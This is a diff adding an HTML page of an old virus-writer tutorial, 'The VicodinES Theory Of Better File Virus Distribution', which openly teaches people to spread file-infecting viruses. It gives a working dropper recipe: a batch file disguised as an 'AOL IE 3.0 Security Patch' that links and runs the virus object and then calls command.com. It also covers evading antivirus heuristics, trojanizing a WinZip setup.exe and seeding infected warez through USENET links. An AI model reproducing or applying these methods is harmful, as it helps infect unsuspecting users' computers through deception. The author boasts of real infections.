@@ -1,0 +1,269 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - The VicodinES Theory Of Better File Virus Distribution</TITLE>
+   
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><FONT COLOR="#004080"><FONT FACE="Comic Sans MS"><FONT SIZE=+1>The
+VicodinES<BR>
+<BR>
+</FONT></FONT><B><U><FONT SIZE=+2>Theory Of Better File Virus Distribution<BR>
+</FONT></U></B>(a study in new ideas?)</FONT></P></CENTER>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<P><BR>
+     Ok so you managed to get over your first hurdle,
+you managed to make/hack/remix a memory resident *.com file infecting virus.
+Congratulations! I mean that wholeheartedly. So now what? Did you spend
+all that time learning and debugging .asm files just so it would sit on
+your HD? No? I didn't think so. So what's your next move? <B><FONT COLOR="#FF0000">DISTRIBUTION!</FONT></B>
+</P>
+
+<P>     The first rule of distribution for a file infector
+is demand. You must create a demand or use a program that is in demand
+as a host. Without demand your file will never be downloaded or run. <BR>
+    Second, deception! You must be able to get your virus
+past most AV products or you will never get a chance to infect. How is
+your code? Can you sneak by heuristics? You will need a way to sneak your
+virus passed the most <BR>
+common AV programs, even if you're heuristically challenged. Can that be
+done? Yes, a clever dropper can do that. How? .... read on. <BR>
+    Third, infection! Infect on the first run! This also
+requires a decently <BR>
+clever dropper. What good is a memory resident *.com infecting virus if
+it's run and then no .com files are run the entire time it's resident.
+Then *poof* someone shuts off the computer and never runs your dropper
+again? That would be fine if you had written a multipartite virus but for
+this first example we are concentrating on a beginners virus, a basic *.com
+memory resident file infector. </P>
+
+<P>     Ok so I say that Virus Distribution consists
+of three basic components: <BR>
+<FONT COLOR="#FF0000">DEMAND</FONT>, <FONT COLOR="#FF0000">DECEPTION</FONT>
+and <FONT COLOR="#FF0000">INFECTION</FONT>. Am I right? Is this a sound
+theory? Well let me back up my theory with an example or two. <BR>
+  </P>
+
+<P><B><FONT SIZE=+1>EXAMPLE #1:</FONT></B> <BR>
+     <B>The Virus:</B> *.com memory resident file infector.
+(virus.com) <BR>
+     <B>Tools Needed:</B> Tlink, Bat2exe, the virus.obj
+file (you can find Bat2exe <BR>
+                           
+from filez.com if you don't already have it and you must already have Tlink
+and <BR>
+                           
+the .obj file if you wrote the virus!) </P>
+
+<P>    Ok so you have everything you need and you're just
+dying to infect the world. Ok, give it some thought. Think &quot;DEMAND.&quot;
+In this example we will capitalize on a current issue and create demand.
+In this case we dream up an <BR>
+&quot;AOL IE 3.0 Security Patch&quot; and our method of distribution will
+be AOL and USENET. You see, I have already done this. When AOL had their
+big crash I created an Anti-Crash &quot;AOL Approved&quot; Downloadable
+Patch. You say no one would ever fall for that :) .. yea right! So I just
+retooled that idea for &quot;right now&quot; - AOL only came out with a
+patch for their IE integrated browser on 7-7-97 :) .... Anticipate demand,
+create demand or capitalize on demand. Ok so now everyone who uses AOL
+will want to be secure, and you have made a program that is in demand.
+<BR>
+ With demand out of the way we need to concentrate on deception. Now,
+most computer users are not that bright but they know better than to just
+run a .bat file - hell I have even heard that some computer users even
+know how <BR>
+to view .bat files and look for suspicious content! So we will hide our
+.bat file in a .com. (realistically though your chance won't drop that
+much if you just leave it as a .bat) </P>
+
+<P><B><I>Ok lets make that dropper!</I></B> </P>
+
+<OL>
+<LI>Rename tlink.exe to patch.exe</LI>
+
+<LI>Rename virus.obj to patch.obj</LI>
+
+<LI>Create a nice descriptive .doc or readme.txt file to calm the user's
+nerves.</LI>
+
+<LI>Create a .bat file that acts like your file description.</LI>
+
+<P><BR>
+    aol_ie.bat : <BR>
+        cls <BR>
+        echo  Press any key to
+update your Internet Explorer For America Online <BR>
+        pause&gt;nul <BR>
+        patch /t patch.obj         
+<I>;link the virus</I> <BR>
+        patch                           
+<I>;run the virus</I> <BR>
+        command                    
+<I>;call command.com for infection</I> </P>
+
+<LI>bat2exe your aol_ie.bat - it will result in aol_ie.com [you can skip
+this part if you have to]</LI>
+
+<LI>Package your files into a nice .zip or if you want you can use a self
+extracting compression program but use one with an icon!! (WinZip or RAR)  
+[icons calm new computer user's nerves!]</LI>
+</OL>
+
+<P>So your zip will contain : <BR>
+            patch.exe      
+[why did you rename tlink.exe? patch goes with the flow better than tlink.exe
+<BR>
+                                   
+and will not arouse suspicion] <BR>
+            patch.obj      
+[why did you rename virus.obj? also goes with the flow better] <BR>
+            aol_ie.com    
+[the dropper .bat converted to .com] <BR>
+            readme.txt     
+[be creative here!!] <BR>
+  <BR>
+<FONT COLOR="#663300">*** [EXTRA] Take it a bit further! . If you want
+to you can add a few extra steps like creating a .pif for your .com [or
+.bat] or by including a hidden .ico or .dll file to go along with your
+.pif . use your imagination ***</FONT> </P>
+
+<P><FONT COLOR="#663300">*** [EXTRA] Take it a bit further! ... You can
+also fatten up your zip with miscellaneous files of varying size renamed
+to patch.dat or something equally innocuous ***</FONT> </P>
+
+<P><FONT COLOR="#663300">*** [Snag?] Did we hit a snag? . What if they
+view these files with a hex editor or text editor? No problem - all they
+will see is the inside of tlink.exe or some commands in aol_ie.com like
+patch and pause, certainly nothing to be alarmed about :) ***</FONT> </P>
+
+<P>    So is the deception complete? More than you may realize.
+They downloaded your zip and scanned it. They did a deep or heuristic scan!!!
+Are you worried? Should you worry because your virus is heuristically challenged?
+<BR>
+Not really - you have a 75% better chance of beating heuristics in .obj
+form :) ... don't believe me? Test that one yourself. Also your aol_ie.com
+has the pause command in it. What virus pauses before it infects? Do you
+know of one? It doesn't make logical sense ... that's why we do it. </P>
+
+<P>    Finally, we need instant infection. Wait, that's
+already done. Did you catch it? The third to last line in our bat links
+the viral code and creates the actual virus. The second to last line runs
+our virus which, in turn goes memory <BR>
+resident. Then the last line of our very simple dropper runs command.com.
+We just went memory resident and then got command.com! Hell that means
+that even if our user has Win95 we still get a chance to go active every
+time they invoke a DOS Prompt or Shut Down To DOS. Also our heuristically
+challenged virus wasn't even created until after the download was scanned
+and no current AV programs (that I know of) support heuristics in their
+memory esident <BR>
+scanner! </P>
+
+<P>    So in example #1 I demonstrated how some thought
+and ingenuity combined with my theory of &quot;Better Distribution&quot;
+can increase your chances of infecting a new machine and spreading. Example
+#1 only deals with a very simple virus and limited targets (how many .com
+files can you find on your system?) ... but our mission was to increase
+the chances of infection and survival and we did that 10 fold!! </P>
+
+<P>    Ok, do you subscribe to my theory of Better Distribution
+yet? No? I'll try once again with a more complex virus and a totally different
+angle, but sticking to the main points of my theory : DEMAND, DECEPTION
+and INFECTION! <BR>
+  </P>
+
+<P><B><FONT SIZE=+1>EXAMPLE #2:</FONT></B> <BR>
+<B>    The Virus:</B> *.exe (Windows EXE) non-memory resident
+file infector. (virus.exe) <BR>
+<B>    Tools Needed:</B> A current or new beta release of
+a popular Windows program. </P>
+
+<P>    Ok let's start! Mission number one? DEMAND! For this
+example let's use the latest greatest release of WinZip (beta or otherwise).
+That should take care of demand - everyone wants a new FREE version of
+WinZip. It's a good universal program to use just like pkzip was a few
+years ago. </P>
+
+<P>    As you just saw demand takes care of itself if you
+just put a little thought into it. Lets see if DECEPTION will do the same
+thing. How do you infect WinZip? Well, since this a more advanced example
+I will just assume that <BR>
+I don't have to show you how to infect a file. But, I will tell you to
+test your work! Think! The WinZip setup program is a lot more complex than
+any dropper .bat file we can construct so be sure to test your infection.
+For example I have done the WinZip thing and the Setup.exe for the 16bit
+WinZip has to have <BR>
+the exact same time/date stamp as the readme.txt. You may have made a successful
+infection but your deception will fail if the infected program screams
+that time/date stamps don't match! So with the more complex programs <BR>
+deception takes a bit more thought. Does the deception end here? No. How
+will you distribute this virus in a deceptive way? If you follow the normal
+route of distribution for a new virus that is attached to a new ware then
+you would just post the zip to alt.binaries.warez and all other warez-related
+newsgroups.  Well, <BR>
+that's great but Dr Solly scans most binary newsgroups and posts virus
+alerts and instant fixes. So in one day you can be found, named and have
+a remover. That is the worst thing that could ever happen to a new virus!
+So what's there to do? Well either scam some warez web sites or warez traders
+into taking your file if <BR>
+it's legit (but infected) or do what I do/did and post to all those USENET
+warez related newsgroups with a LINK to some hacked out ftp or web site
+where the file is stored!! No one bothers to follow all warez links and
+scan them. Shit, I did this for one of my files and hid a counter on the
+site . it reached 553 before Geocities threw me off for distributing registered
+software. Now think about that - I took a new, not named and currently
+unscannable virus and had 500+ people seek it out (and run it?). For deceptive
+distribution that was a slam-dunk! </P>
+
+<P>    Ok now how did my INFECTION take care of itself?
+I chose a setup.exe!!! You have to choose your carriers wisely. A setup
+program usually runs all over and infects the program that it is setting
+up, in this case WinZip. <BR>
+Plus, WinZip is an often used program which greatly increases your chances
+of survival and any self extracting archives will be carriers or my virus!
+</P>
+
+<P>    Are you now convinced that my &quot;Theory of Better
+Distribution&quot; is the way to attack your next world wide virus infection?
+I hope so. </P>
+
+<P>    Boot sector virii don't have to rule the world of
+distribution (and the Wild List!) - think hard and you will figure out
+new and ingenious ways to make someone want your virus. I hope that I have
+made you think a bit harder about what you're going to do the next time
+that you decide to distribute one of your virii. Hopefully you will never
+again just upload some &quot;new patch&quot; for some obscure program to
+a local BBS and pray that your virus makes it around the world. If this
+was 1989 then you may have had a chance but remember that you have to think
+about now. Also, don't think you can just upload sex.exe to alt.binaries.erotica.
+Few people are stupid enough for run an .exe from a porn newsgroups (though
+I believe some are - just not enough of them to count). </P>
+
+<P>    Once again remember you have to think about now,
+don't take into account how they used to do it! Think about how you can
+do it now! How do you get files now? What programs do you want now? What
+makes you suspicious now? </P>
+
+<P>    Remember unless you still want to live that &quot;I
+just write virii for research&quot; lie then you need to think as hard
+about your distribution as you did on making your multipartite encrypted
+armored polymorphic stealth tunneling memory resident Windows 95 virus!!!
+</P>
+
+<P>Peace, <BR>
+<FONT FACE="Comic Sans MS"><A HREF="mailto:vcru@hotmail.com">VicodinES</A></FONT>
+</P>
+
+<P>Ps. I also recommend you get the Nowhere Utilities by Nowhere Man! Fucking
+great tools for deception! </P>
+
+<P><I>[text content edited by Commander Ritalin and Fastin.Blee]</I> <BR>
+  
+<HR></P>
+
+</BODY>
+</HTML>
